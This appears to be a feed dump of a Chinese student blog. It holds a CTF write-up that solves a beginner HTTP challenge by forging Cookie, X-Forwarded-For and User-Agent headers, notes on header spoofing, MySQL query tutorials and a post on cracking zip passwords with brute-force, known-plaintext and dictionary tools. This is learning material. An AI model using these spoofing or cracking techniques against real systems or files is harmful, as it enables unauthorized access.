    <title>西电2023webhttp</title>
    <link href="http://example.com/2023/10/25/%E8%A5%BF%E7%94%B52023webhttp/"/>
    <id>http://example.com/2023/10/25/%E8%A5%BF%E7%94%B52023webhttp/</id>
    <published>2023-10-25T10:10:17.000Z</published>
    <updated>2023-10-27T08:07:21.050Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西电-2023-web-http"><a href="#西电-2023-web-http" class="headerlink" title="西电 2023 web http"></a>西电 2023 web http</h1><h2 id="一-题目"><a href="#一-题目" class="headerlink" title="一. 题目"></a>一. 题目</h2><p>​                                      this is POST method,</p><p>​                                       your mission:</p><p>​                                      1.use parameter: UwU&#x3D;u<br>​                                      2.post <strong>form</strong>: Luv&#x3D;u<br>​                                      3.use admin character<br>​                                      4.request from 127.0.0.1<br>​                                      5.use browser ‘MoeBrowser’<br>​                                      Complete All Missions</p><h2 id="二-下面一题一题讲解，并附上知识点"><a href="#二-下面一题一题讲解，并附上知识点" class="headerlink" title="二. 下面一题一题讲解，并附上知识点"></a>二. 下面一题一题讲解，并附上知识点</h2><h3 id="1-use-parameter-参数-UwU-u"><a href="#1-use-parameter-参数-UwU-u" class="headerlink" title="1. use parameter(参数) : UwU&#x3D;u"></a>1. use parameter(参数) : UwU&#x3D;u</h3><p>本题使用 get 传参，具体非常简单。MODE 模式 RAW 下呈现为</p><p>​                                 GET &#x2F;?UwU&#x3D;u    HTTP&#x2F;1.1</p><p>Basic 下呈现为</p><p>​                          <a href="http://124.70.99.199:3800/?UwU=u">http://124.70.99.199:3800/?UwU=u</a></p><p>如果用POST ,RAW 下呈现为</p><p>​                               POST &#x2F;?UwU&#x3D;u HTTP&#x2F;1.1</p><p>Basic 呈现下为</p><p><a href="http://124.70.99.199:3800/?UwU=u">http://124.70.99.199:3800/?UwU=u</a></p><p>很显然，极为相似</p><h3 id="2-post-form-Luv-u"><a href="#2-post-form-Luv-u" class="headerlink" title="2. post form: Luv&#x3D;u"></a>2. post <strong>form</strong>: Luv&#x3D;u</h3><p>本题使用 POST 传表单，enctype（POST提交数据方式）是</p><p>​                    application&#x2F;x-www-form-urlencoded</p><p>POST 提交数据形式一共有四种，如下</p><ul><li>application&#x2F;x-www-form-urlencoded     专门传表单（URL encoded）</li><li>multipart&#x2F;form-data （键值对型数据）  通常是用在客户端向服务端传送大文件数据，如：图片或者文件。</li><li>application&#x2F;json (Json 类型数据)  数据以 Json 字符串的形式存在</li><li>text&#x2F;xml （xml）一种使用 HTTP 作为传输协议，XML 作为编码方式的远程调用规范</li></ul><p>RAW 在最下方呈现为(将水平分割线视作下划线)</p><p>Luv&#x3D;u</p><hr><p>Basic  在最下方呈现为(将水平分割线视作下划线)</p><p>Body</p><p>Luv&#x3D;u</p><hr><h3 id="3-use-admin-character"><a href="#3-use-admin-character" class="headerlink" title="3.use admin character"></a>3.use admin character</h3><p>使用  Cookie </p><p>格式如下  </p><p>RAW 下呈现为</p><p>​                            Cookie: character&#x3D;admin</p><p>Basic 下呈现过于简单，不讲</p><h3 id="4-request-from-127-0-0-1"><a href="#4-request-from-127-0-0-1" class="headerlink" title="4.request from 127.0.0.1"></a>4.request from 127.0.0.1</h3><p>使用 xff （X-Forwarded-For）</p><p>格式如下  </p><p>RAW 下呈现为</p><p>​                            X-Forwarded-For: 127.0.0.1</p><p>Basic 下呈现过于简单，不讲</p><p>​                             </p><h3 id="5-use-browser-‘MoeBrowser’"><a href="#5-use-browser-‘MoeBrowser’" class="headerlink" title="5.use browser ‘MoeBrowser’"></a>5.use browser ‘MoeBrowser’</h3><p>使用 User-Agent </p><p>格式如下  </p><p>RAW 下呈现为</p><p>​                         User-Agent: MoeBrowser</p><p>Basic 下呈现过于简单，不讲</p><p>得到flag：Fl4g{w3lc0m3_t0_th3_w0rld_0f_http!!}</p><h3 id="附-展示-RAW-完整模板"><a href="#附-展示-RAW-完整模板" class="headerlink" title="附 展示 RAW 完整模板"></a>附 展示 RAW 完整模板</h3><p>HTTP     124.70.99.199.3800</p><hr><p>POST &#x2F;?UwU&#x3D;u HTTP&#x2F;1.1<br>X-Forwarded-For: 127.0.0.1<br>Upgrade-Insecure-Requests: 1<br>Origin: <a href="http://124.70.99.199:3800/">http://124.70.99.199:3800</a><br>Content-Type: application&#x2F;x-www-form-urlencoded<br>User-Agent: MoeBrowser<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Referer: <a href="http://124.70.99.199:3800/?UwU=u">http://124.70.99.199:3800/?UwU=u</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q&#x3D;0.9,en;q&#x3D;0.8<br>Cookie: character&#x3D;admin</p><p>Luv&#x3D;u</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;西电-2023-web-http&quot;&gt;&lt;a href=&quot;#西电-2023-web-http&quot; class=&quot;headerlink&quot; title=&quot;西电 2023 web http&quot;&gt;&lt;/a&gt;西电 2023 web http&lt;/h1&gt;&lt;h2 id=&quot;一-题目&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="http" scheme="http://example.com/tags/http/"/>
    
  </entry>
  
  <entry>
    <title>请求头笔记及引用源记录</title>
    <link href="http://example.com/2023/10/25/%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%AC%94%E8%AE%B0%E5%8F%8A%E5%BC%95%E7%94%A8%E6%BA%90%E8%AE%B0%E5%BD%95/"/>
    <id>http://example.com/2023/10/25/%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%AC%94%E8%AE%B0%E5%8F%8A%E5%BC%95%E7%94%A8%E6%BA%90%E8%AE%B0%E5%BD%95/</id>
    <published>2023-10-25T04:29:43.000Z</published>
    <updated>2023-10-25T09:08:05.829Z</updated>
    
    <content type="html"><![CDATA[<h1 id="请求头笔记及引用源记录"><a href="#请求头笔记及引用源记录" class="headerlink" title="请求头笔记及引用源记录"></a>请求头笔记及引用源记录</h1><h2 id="一-xff-与-referer"><a href="#一-xff-与-referer" class="headerlink" title="一. xff 与 referer"></a>一. xff 与 referer</h2><p>xff: </p><p>xff 全称 X-Forwarded-For ，是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。</p><p>运用格式       </p><p>​                                 X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p><p>referer</p><p>referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p><p>运用格式</p><p>​                                                Referer &#x3D; <a href="https://www.xxxx.com/">https://www.xxxx.com</a></p><p>引用源url：<a href="https://blog.csdn.net/qq_40481505/article/details/90114951">https://blog.csdn.net/qq_40481505/article/details/90114951</a></p><p>​                  <a href="https://www.cnblogs.com/huhu1020387597/p/11479468.html">HTTP协议头部REFERER用法及伪造 - 糊糊饭团 - 博客园 (cnblogs.com)</a></p><p>附：hackbar 使用方法：<a href="https://juejin.cn/post/6987217287941996580">https://juejin.cn/post/6987217287941996580</a></p><h2 id="二-cookie"><a href="#二-cookie" class="headerlink" title="二. cookie"></a>二. cookie</h2><p>格式</p><p>Set－Cookie: NAME&#x3D;VALUE；Expires&#x3D;DATE；Path&#x3D;PATH；Domain&#x3D;DOMAIN_NAME；SECURE</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;请求头笔记及引用源记录&quot;&gt;&lt;a href=&quot;#请求头笔记及引用源记录&quot; class=&quot;headerlink&quot; title=&quot;请求头笔记及引用源记录&quot;&gt;&lt;/a&gt;请求头笔记及引用源记录&lt;/h1&gt;&lt;h2 id=&quot;一-xff-与-referer&quot;&gt;&lt;a href=&quot;#一-</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>mysql单表处理大总结1.0</title>
    <link href="http://example.com/2023/10/24/mysql%E8%A1%A8%E6%A0%BC%E5%A4%84%E7%90%86%E5%A4%A7%E6%80%BB%E7%BB%931-0/"/>
    <id>http://example.com/2023/10/24/mysql%E8%A1%A8%E6%A0%BC%E5%A4%84%E7%90%86%E5%A4%A7%E6%80%BB%E7%BB%931-0/</id>
    <published>2023-10-24T11:49:32.000Z</published>
    <updated>2023-10-24T14:43:55.111Z</updated>
    
    <content type="html"><![CDATA[<p>一. 总体格式</p><p>select<br>        …<br>    from<br>        …<br>    where<br>        …<br>    group by<br>        …<br>    having<br>        …<br>    order by<br>        …</p><p>关键字顺序不能错</p><p>二. 执行顺序（执行逻辑）</p><ol><li>from</li><li>where</li><li>groub by</li><li>having</li><li>select</li><li>order by</li></ol><p>从某张表中查询数据，from</p><p>先经过where条件筛选出有价值的数据。where</p><p>对这些有价值的数据进行分组。group by</p><p>分组之后可以使用having继续筛选。having</p><p>select查询出来。select</p><p>最后排序输出！order by</p><p>eg.（数据库：bjpowernode）</p><p>找出每个岗位的平均薪资，要求显示平均薪资大于1500的，除MANAGER岗位之外，<br>要求按照平均薪资降序排。<br>        select<br>            job, avg(sal) as avgsal<br>        from<br>            emp<br>        where<br>            job &lt;&gt; ‘MANAGER’<br>        group by<br>            job<br>        having<br>            avg(sal) &gt; 1500<br>        order by<br>            avgsal desc;</p><pre><code>    +-----------+-------------+    | job       | avgsal      |    +-----------+-------------+    | PRESIDENT | 5000.000000 |    | ANALYST   | 3000.000000 |    +-----------+-------------+</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一. 总体格式&lt;/p&gt;
&lt;p&gt;select&lt;br&gt;        …&lt;br&gt;    from&lt;br&gt;        …&lt;br&gt;    where&lt;br&gt;        …&lt;br&gt;    group by&lt;br&gt;        …&lt;br&gt;    having&lt;br&gt;     </summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="总体规律" scheme="http://example.com/tags/%E6%80%BB%E4%BD%93%E8%A7%84%E5%BE%8B/"/>
    
  </entry>
  
  <entry>
    <title>分组查询1.0</title>
    <link href="http://example.com/2023/10/24/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%E8%A1%A5%E5%BD%951-0/"/>
    <id>http://example.com/2023/10/24/%E5%88%86%E7%BB%84%E6%9F%A5%E8%AF%A2%E8%A1%A5%E5%BD%951-0/</id>
    <published>2023-10-24T11:30:32.000Z</published>
    <updated>2023-10-24T14:49:35.946Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分组查询1-0"><a href="#分组查询1-0" class="headerlink" title="分组查询1.0"></a>分组查询1.0</h1><h2 id="一"><a href="#一" class="headerlink" title="一."></a>一.</h2><ol><li>模板</li></ol><p>   ​                      select<br>   ​…<br>   ​from<br>   ​…<br>   ​group by<br>   ​…</p><ol start="2"><li><p>为什么分组函数不能直接使用在where后面？<br>   因为分组函数在使用的时候必须先分组之后才能使用。<br>   where执行的时候，还没有分组。所以where后面不能出现分组函数。</p></li><li><p>针对2. 的过滤 having</p><p>select name1, name2 from name(表名) group by name2 having name2&gt;a;</p><p>使用having可以对分完组之后的数据进一步过滤。<br>having不能单独使用，having不能代替where，having必须<br>和group by联合使用。<br>优化策略：<br>where和having，优先选择where，where实在完成不了了，再选择having。</p><h2 id="二"><a href="#二" class="headerlink" title="二."></a>二.</h2><p>多分组</p><p>select name1 name2 from name(表名) group by name1, name2;</p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;分组查询1-0&quot;&gt;&lt;a href=&quot;#分组查询1-0&quot; class=&quot;headerlink&quot; title=&quot;分组查询1.0&quot;&gt;&lt;/a&gt;分组查询1.0&lt;/h1&gt;&lt;h2 id=&quot;一&quot;&gt;&lt;a href=&quot;#一&quot; class=&quot;headerlink&quot; title=&quot;一.&quot;</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="where不适用及having过滤" scheme="http://example.com/tags/where%E4%B8%8D%E9%80%82%E7%94%A8%E5%8F%8Ahaving%E8%BF%87%E6%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>MySQL多行处理函数1-0</title>
    <link href="http://example.com/2023/10/23/MySQL%E5%A4%9A%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/"/>
    <id>http://example.com/2023/10/23/MySQL%E5%A4%9A%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/</id>
    <published>2023-10-23T09:59:11.000Z</published>
    <updated>2023-10-24T14:47:23.592Z</updated>
    
    <content type="html"><![CDATA[<p>​                              MySQL多行处理函数1-0</p><p>一. 多行处理函数种类</p><p>​                                          count计数<br>​                          sum求和<br>​                          avg平均值<br>​                          max最大值<br>​                          min最小值</p><p>二. 注意事项</p><ol><li>特点：输入多行，输出一行。</li><li>先对数据分组，再使用分组函数。若没有对数据分组，默认整张表为一组。</li><li>分组函数自动忽略 NULL ，不需要对 NULL 提前处理。</li><li>分组函数中count(*)和count(具体字段)有什么区别，区别在于 NULL 是否影响计算。解释如下：</li></ol><p>count(具体字段)：表示统计该字段下所有不为NULL的元素的总数。</p><p>count(*)：统计表当中的总行数。</p><p>因为每一行记录不可能都为NULL，一行数据中有一列不为NULL，则这行数据就是有效的。</p><ol start="5"><li>分组函数不能够直接使用在where子句中。（以后解释）</li><li>所有的分组函数可以组合起来一起用。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                              MySQL多行处理函数1-0&lt;/p&gt;
&lt;p&gt;一. 多行处理函数种类&lt;/p&gt;
&lt;p&gt;​                                          count	计数&lt;br&gt;​		       </summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="概述" scheme="http://example.com/tags/%E6%A6%82%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>MySQL单行处理函数1.0</title>
    <link href="http://example.com/2023/10/22/MySQL%E5%8D%95%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/"/>
    <id>http://example.com/2023/10/22/MySQL%E5%8D%95%E8%A1%8C%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B01-0/</id>
    <published>2023-10-22T15:25:28.000Z</published>
    <updated>2023-11-05T07:17:25.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL单行处理函数1-0"><a href="#MySQL单行处理函数1-0" class="headerlink" title="MySQL单行处理函数1.0"></a>MySQL单行处理函数1.0</h1><h2 id="一-lower-转换小写"><a href="#一-lower-转换小写" class="headerlink" title="一. lower 转换小写"></a>一. lower 转换小写</h2><p><code>select  </code></p><p><code>lower(name1)  name2 </code></p><p>&#96; from </p><p><code> name(表名);</code> </p><h2 id="二-upper-转换大写"><a href="#二-upper-转换大写" class="headerlink" title="二. upper 转换大写"></a>二. upper 转换大写</h2><p><code>select </code></p><p><code> upper(name1)  name2</code> </p><p><code> from </code>  </p><p><code>name(表名);</code> </p><h2 id="三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）"><a href="#三-substr-取子串（substr-被截取的字符串-起始下标-截取的长度-）" class="headerlink" title="三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）"></a>三. substr 取子串（substr( 被截取的字符串, 起始下标,截取的长度)）</h2><p><code>select </code></p><p><code>substr(name1,n,m) name2</code></p><p><code> from</code> </p><p><code> name(表名);</code></p><p>n&gt;&#x3D;1, m&gt;&#x3D;1；name1 是列名。</p><h3 id="附带例子："><a href="#附带例子：" class="headerlink" title="附带例子："></a>附带例子：</h3><h4 id="找出员工名字第一个字母是A的员工信息？"><a href="#找出员工名字第一个字母是A的员工信息？" class="headerlink" title="找出员工名字第一个字母是A的员工信息？"></a>找出员工名字第一个字母是A的员工信息？</h4><h5 id="第一种方式：模糊查询"><a href="#第一种方式：模糊查询" class="headerlink" title="第一种方式：模糊查询"></a>第一种方式：模糊查询</h5><p><code>select</code></p><p> ename&#96; </p><p><code>from</code> </p><p><code>emp</code></p><p><code> where</code> </p><p><code> ename like &#39;A%&#39;;</code></p><h5 id="第二种方式：substr函数"><a href="#第二种方式：substr函数" class="headerlink" title="第二种方式：substr函数"></a>第二种方式：substr函数</h5><p><code>select</code></p><p><code>ename</code> </p><p><code>from</code></p><p><code>emp</code> </p><p><code>where </code></p><p><code>substr(ename,1,1) = &#39;A&#39;;</code></p><h3 id="拓展例子："><a href="#拓展例子：" class="headerlink" title="拓展例子："></a>拓展例子：</h3><h4 id="实现首字母大写"><a href="#实现首字母大写" class="headerlink" title="实现首字母大写"></a>实现首字母大写</h4><p><code>select</code></p><p><code> concat(upper(substr(name,1,1)),substr(name,2,length(name) - 1)) as result</code> </p><p><code> from</code> </p><p><code> t_student;</code></p><h4 id="补充：concat-：进行字符串的拼接"><a href="#补充：concat-：进行字符串的拼接" class="headerlink" title="补充：concat ：进行字符串的拼接"></a>补充：concat ：进行字符串的拼接</h4><p><code>select </code></p><p><code> concat  (name1,name2) name3</code> </p><p><code> from</code> </p><p><code>  name(表名);</code></p><h2 id="四-length-取长度"><a href="#四-length-取长度" class="headerlink" title="四. length 取长度"></a>四. length 取长度</h2><p><code>select</code></p><p><code>  length(name)  lengthname</code>  </p><p><code>  from</code>  </p><p><code> name(表名);</code> </p><h2 id="五-trim-去空格"><a href="#五-trim-去空格" class="headerlink" title="五. trim 去空格"></a>五. trim 去空格</h2><p><code>select</code> </p><p><code>trim(&#39;             A&#39;)</code></p><p><code>from</code> </p><p><code>name(表名)；</code></p><p>查询带 A 的数据</p><p>六. round 四舍五入</p><ol><li><p>先介绍 select 后面可以跟字面量&#x2F;字面值（1000等），也可以跟字符串，但是无论如何，都将把数据同化成它。</p></li><li><p>a.  select</p><p>​     round(1234.567,0) name1</p><p>​     from</p><p>​     name(表名);</p><p>b.  select</p><p>​     round(1234.567,1) name1</p><p>​     from</p><p>​     name(表名);</p><p>c.  select</p><p>​     round(1234.567,-1) name1</p><p>​     from</p><p>​     name(表名);</p></li></ol><p>a. 数据是：1234；b. 数据是：1234.6；c. 数据是：1240</p><p>round(a,n) 中 a 为被四舍五入的数据，n为保留到小数点后几位，n&lt;0 即为整数位四舍五入</p><p>六. rand() 生成随机数</p><p>select</p><p>rand()</p><p>from</p><p>emp;</p><p>七. ifnull 将 null 转换成一个具体值</p><p>ifnull是空处理函数。专门处理空的。在所有数据库当中，只要有NULL参与的数学运算，最终结果就是NULL。</p><p>select </p><p>sal + ifnull(comm,0)*12</p><p>from </p><p>name(表名);</p><p>ifnull (data,n) ：data 为被处理的数据，n为若数据为null，视其为n</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MySQL单行处理函数1-0&quot;&gt;&lt;a href=&quot;#MySQL单行处理函数1-0&quot; class=&quot;headerlink&quot; title=&quot;MySQL单行处理函数1.0&quot;&gt;&lt;/a&gt;MySQL单行处理函数1.0&lt;/h1&gt;&lt;h2 id=&quot;一-lower-转换小写&quot;&gt;&lt;a </summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="lower upper substr concat length trim round rand" scheme="http://example.com/tags/lower-upper-substr-concat-length-trim-round-rand/"/>
    
  </entry>
  
  <entry>
    <title>mysql查询细节补录2</title>
    <link href="http://example.com/2023/10/22/mysql%E6%9F%A5%E8%AF%A2%E7%BB%86%E8%8A%82%E8%A1%A5%E5%BD%952/"/>
    <id>http://example.com/2023/10/22/mysql%E6%9F%A5%E8%AF%A2%E7%BB%86%E8%8A%82%E8%A1%A5%E5%BD%952/</id>
    <published>2023-10-22T12:32:16.000Z</published>
    <updated>2023-10-24T14:45:34.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql查询细节补录2"><a href="#mysql查询细节补录2" class="headerlink" title="mysql查询细节补录2"></a>mysql查询细节补录2</h1><h2 id="一-排序查询"><a href="#一-排序查询" class="headerlink" title="一. 排序查询"></a>一. 排序查询</h2><h3 id="a-select-from-name-表名-order-by-a-asc"><a href="#a-select-from-name-表名-order-by-a-asc" class="headerlink" title="a. select * from name(表名)  order by a (asc);"></a>a. <code>select * from name(表名)  order by a (asc);</code></h3><h3 id="b-select-from-name-表名-order-by-a-desc"><a href="#b-select-from-name-表名-order-by-a-desc" class="headerlink" title="b.  select * from name(表名)  order by a desc ;"></a>b.  <code>select * from name(表名)  order by a desc ;</code></h3><h3 id="c-select-from-name-表名-order-by-a-desc-b-desc"><a href="#c-select-from-name-表名-order-by-a-desc-b-desc" class="headerlink" title="c. select * from name(表名)  order by a desc, b desc;"></a>c. <code>select * from name(表名)  order by a desc, b desc;</code></h3><p>a 为默认，即升序。其实也可以多此一举，升序为 asc 。</p><p>b 有 desc ，为降序。</p><p>c. 多字段排序，先 a 后 b ，皆降序。只有 a 相等时，才会考虑 b 条件。</p><h2 id="二-去重-distinct"><a href="#二-去重-distinct" class="headerlink" title="二. 去重  distinct"></a>二. 去重  distinct</h2><p>select distinct name1 name2 name3 ······ from name(表名)</p><p>distinct 应放在所有字段的前面，后面所有字段一起合理去重</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;mysql查询细节补录2&quot;&gt;&lt;a href=&quot;#mysql查询细节补录2&quot; class=&quot;headerlink&quot; title=&quot;mysql查询细节补录2&quot;&gt;&lt;/a&gt;mysql查询细节补录2&lt;/h1&gt;&lt;h2 id=&quot;一-排序查询&quot;&gt;&lt;a href=&quot;#一-排序查询&quot;</summary>
      
    
    
    
    <category term="MySQL" scheme="http://example.com/categories/MySQL/"/>
    
    
    <category term="排序查询，去重" scheme="http://example.com/tags/%E6%8E%92%E5%BA%8F%E6%9F%A5%E8%AF%A2%EF%BC%8C%E5%8E%BB%E9%87%8D/"/>
    
  </entry>
  
  <entry>
    <title>口令破译方式1.0</title>
    <link href="http://example.com/2023/10/22/%E7%A0%B4%E8%AF%91%E5%8F%A3%E4%BB%A4%E6%96%B9%E5%BC%8F1-0/"/>
    <id>http://example.com/2023/10/22/%E7%A0%B4%E8%AF%91%E5%8F%A3%E4%BB%A4%E6%96%B9%E5%BC%8F1-0/</id>
    <published>2023-10-22T10:52:14.000Z</published>
    <updated>2023-10-24T14:49:55.711Z</updated>
    
    <content type="html"><![CDATA[<h1 id="口令破译方式1-0"><a href="#口令破译方式1-0" class="headerlink" title="口令破译方式1.0"></a>口令破译方式1.0</h1><h2 id="一-暴力破解"><a href="#一-暴力破解" class="headerlink" title="一. 暴力破解"></a>一. 暴力破解</h2><p>采用穷举法来试出口令。本人目前采用 Ziperello 来实现暴力破解。具体没有什么可讲的。</p><h2 id="二-明文攻击"><a href="#二-明文攻击" class="headerlink" title="二. 明文攻击"></a>二. 明文攻击</h2><p>原理不知，方法如下：</p><p>实验需要工具：WinRaR , ARCHPR；</p><p>需要文件等：明文，目的包压缩包（必须含有明文）；</p><h3 id="通法流程："><a href="#通法流程：" class="headerlink" title="通法流程："></a>通法流程：</h3><p>第一步：找到明文，这是一切的一切；</p><p>第二步：运用多种压缩方式压缩明文，得到与目的包压缩包一致的压缩明文包；附：观察两压缩包明文的 crc32 是否一致，可确认第二步是否正确。</p><p>第三步：运用工具实现明文攻击，得到目的文件。</p><h3 id="实例：（自己构建明文和目的包进行实验）"><a href="#实例：（自己构建明文和目的包进行实验）" class="headerlink" title="实例：（自己构建明文和目的包进行实验）"></a>实例：（自己构建明文和目的包进行实验）</h3><p>运用 WinRaR 得到压缩明文和压缩目的包（都是zip），再运用 WinRaR 观察两包 crc32 是否一致（一般一致），再运用 ARCHPR 进行明文攻击。</p><h4 id="该实验细节补充："><a href="#该实验细节补充：" class="headerlink" title="该实验细节补充："></a>该实验细节补充：</h4><h4 id="1-压缩目的包时，设置密码进去有一个-zip-传统加密，必须要点。"><a href="#1-压缩目的包时，设置密码进去有一个-zip-传统加密，必须要点。" class="headerlink" title="1.压缩目的包时，设置密码进去有一个 zip 传统加密，必须要点。"></a>1.压缩目的包时，设置密码进去有一个 zip 传统加密，必须要点。</h4><h4 id="2-运用-APCHPR-明文攻击时，一般先选择明文压缩包，然后是目的包压缩包。"><a href="#2-运用-APCHPR-明文攻击时，一般先选择明文压缩包，然后是目的包压缩包。" class="headerlink" title="2.运用 APCHPR 明文攻击时，一般先选择明文压缩包，然后是目的包压缩包。"></a>2.运用 APCHPR 明文攻击时，一般先选择明文压缩包，然后是目的包压缩包。</h4><h2 id="三-字典"><a href="#三-字典" class="headerlink" title="三. 字典"></a>三. 字典</h2><p>目前不知原理</p><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><p>与明文攻击实例类似，不过对于复杂的口令，可以制作一个 txt 文本（包含密码或者部分密码）作为字典，速度非常快。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;口令破译方式1-0&quot;&gt;&lt;a href=&quot;#口令破译方式1-0&quot; class=&quot;headerlink&quot; title=&quot;口令破译方式1.0&quot;&gt;&lt;/a&gt;口令破译方式1.0&lt;/h1&gt;&lt;h2 id=&quot;一-暴力破解&quot;&gt;&lt;a href=&quot;#一-暴力破解&quot; class=&quot;head</summary>
      
    
    
    
    <category term="杂项" scheme="http://example.com/categories/%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="概述" scheme="http://example.com/tags/%E6%A6%82%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>mysql查询细节补录</title>
    <link href="http://example.com/2023/10/21/mysql%E6%9F%A5%E8%AF%A2%E7%BB%86%E8%8A%82%E8%A1%A5%E5%BD%95/"/>
    <id>http://example.com/2023/10/21/mysql%E6%9F%A5%E8%AF%A2%E7%BB%86%E8%8A%82%E8%A1%A5%E5%BD%95/</id>
    <published>2023-10-21T15:30:46.000Z</published>
    <updated>2023-10-24T14:45:11.610Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mysql查询细节补录"><a href="#mysql查询细节补录" class="headerlink" title="mysql查询细节补录"></a>mysql查询细节补录</h1><h2 id="1-引列并起别名的两种方法"><a href="#1-引列并起别名的两种方法" class="headerlink" title="1.引列并起别名的两种方法"></a>1.引列并起别名的两种方法</h2><h3 id="a-select-name1-name2-from-name-表名-；"><a href="#a-select-name1-name2-from-name-表名-；" class="headerlink" title="a. select name1 name2 from name(表名)；"></a>a. <code>select name1 name2 from name(表名)；</code></h3><h3 id="b-select-name1-as-name2-from-name-表名-；"><a href="#b-select-name1-as-name2-from-name-表名-；" class="headerlink" title="b. select name1 as name2 from name(表名)；"></a>b. <code>select name1 as name2 from name(表名)；</code></h3><p>附：select 不会更改数据。</p><h2 id="2-别名带空格或中文"><a href="#2-别名带空格或中文" class="headerlink" title="2.别名带空格或中文"></a>2.别名带空格或中文</h2><h3 id="a-select-name1-name-2-from-name-表名"><a href="#a-select-name1-name-2-from-name-表名" class="headerlink" title="a. select name1 &#39;name    2&#39;  from name(表名);"></a>a. <code>select name1 &#39;name    2&#39;  from name(表名);</code></h3><p>单引号和双引号都可以，但在标准中，字符串（包括中文）应该用单引号。</p><h2 id="3-查询时允许字段使用数学表达式（加减乘除运算）"><a href="#3-查询时允许字段使用数学表达式（加减乘除运算）" class="headerlink" title="3.查询时允许字段使用数学表达式（加减乘除运算）"></a><em>3.查询时允许字段使用数学表达式（加减乘除运算）</em></h2><h3 id="a-select-name-m-sal-12-y-sal-from-name-表名"><a href="#a-select-name-m-sal-12-y-sal-from-name-表名" class="headerlink" title="a. select name, m.sal*12 y.sal from name(表名);"></a>a. <code>select name, m.sal*12 y.sal from name(表名);</code></h3><p>m.money*12 带有计算，将会输出结果。</p><h2 id="4-条件查询-不等于-的两种表示"><a href="#4-条件查询-不等于-的两种表示" class="headerlink" title="4.条件查询 不等于 的两种表示"></a>4.条件查询 不等于 的两种表示</h2><h3 id="a-select-name-from-name-表名-where-a-b"><a href="#a-select-name-from-name-表名-where-a-b" class="headerlink" title="a. select name from name(表名) where a != b;"></a>a. <code>select name from name(表名) where a != b;</code></h3><h3 id="b-select-name-from-name-表名-where-a-b"><a href="#b-select-name-from-name-表名-where-a-b" class="headerlink" title="b. select name from name(表名) where a &lt;&gt; b;"></a>b. <code>select name from name(表名) where a &lt;&gt; b;</code></h3><p>不等于：&lt;&gt;  或  !&#x3D; </p><h2 id="5-条件查询的一些补充"><a href="#5-条件查询的一些补充" class="headerlink" title="5.条件查询的一些补充"></a>5.条件查询的一些补充</h2><h3 id="A-beteen-and-的用法（遵循左小右大原则，即a小b大）"><a href="#A-beteen-and-的用法（遵循左小右大原则，即a小b大）" class="headerlink" title="A. beteen and 的用法（遵循左小右大原则，即a小b大）"></a>A. beteen and 的用法（遵循左小右大原则，即a小b大）</h3><p><code> select name from name(表名) where sal between a and b;</code></p><h3 id="B-null-及-not-null-的用法"><a href="#B-null-及-not-null-的用法" class="headerlink" title="B.  null 及 not null 的用法"></a>B.  null 及 not null 的用法</h3><p><code>select name from name(表名) where sal is null;</code></p><h3 id="C-and-or-优先级"><a href="#C-and-or-优先级" class="headerlink" title="C. and or 优先级"></a>C. and or 优先级</h3><p>and 优先级大于 or ，但可以用小括号来加强优先级，这一点与C语言一致。</p><h3 id="D-in-与-not-in-的用法-in-下面两个效果一致"><a href="#D-in-与-not-in-的用法-in-下面两个效果一致" class="headerlink" title="D. in 与 not in 的用法(in 下面两个效果一致)"></a>D. in 与 not in 的用法(in 下面两个效果一致)</h3><p><code>select * from name(表名) where x = a or x= b;</code></p><p><code>select * from name(表名) where x in(b,c);</code></p><p>int 不是区间，而是具体的值。与之对立的是 not in</p><p><code>select * from name(表名) where x not 